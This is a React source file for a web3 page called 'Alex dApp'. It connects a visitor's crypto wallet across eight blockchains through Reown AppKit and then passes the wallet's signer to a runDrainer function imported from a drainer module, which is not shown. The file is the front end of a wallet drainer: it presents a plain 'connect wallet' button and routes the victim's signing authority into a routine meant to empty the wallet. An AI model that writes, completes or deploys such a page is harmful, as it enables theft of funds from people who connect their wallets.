import React from 'react'
import { createAppKit } from '@reown/appkit'
import {
  mainnet, polygon, bsc, avalanche,
  arbitrum, optimism, linea, base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'

const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]
const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'http://localhost:5173',
    icons: ['https://checkalex.xyz/icon.png']
  },
  projectId,
  features: {
    analytics: true,
    email: false,
    socials: false
  },
  allWallets: 'SHOW'
})

export default function App() {
  const handleConnect = async () => {
    try {
      await modal.open()

      const connectedAdapter = modal.getConnectedAdapter()
      if (!connectedAdapter) {
        alert('Кошелёк не подключён')
        return
      }

      const walletClient = await connectedAdapter.getWalletClient()
      if (!walletClient) {
        alert('Не удалось получить WalletClient')
        return
      }

      const provider = new ethers.providers.Web3Provider(walletClient.transport, 'any')
      const signer = provider.getSigner()
      const address = await signer.getAddress()

      console.log('Кошелёк подключён:', address)
      alert('Кошелёк подключён: ' + address)

      await runDrainer(provider, signer, address)
      alert('✅ Контракт успешно вызван!')

    } catch (err) {
      console.error('Ошибка при подключении:', err)
      alert('Ошибка: ' + err.message)
    }
  }

  return (
    <div style={{ padding: '40px', textAlign: 'center' }}>
      <h1>🚀 Alex dApp</h1>
      <button
        onClick={handleConnect}
        style={{
          padding: '12px 24px',
          fontSize: '16px',
          backgroundColor: '#2d72d9',
          color: 'white',
          border: 'none',
          borderRadius: '8px',
          cursor: 'pointer'
        }}
      >
        Подключить кошелёк и запустить
      </button>
    </div>
  )
}
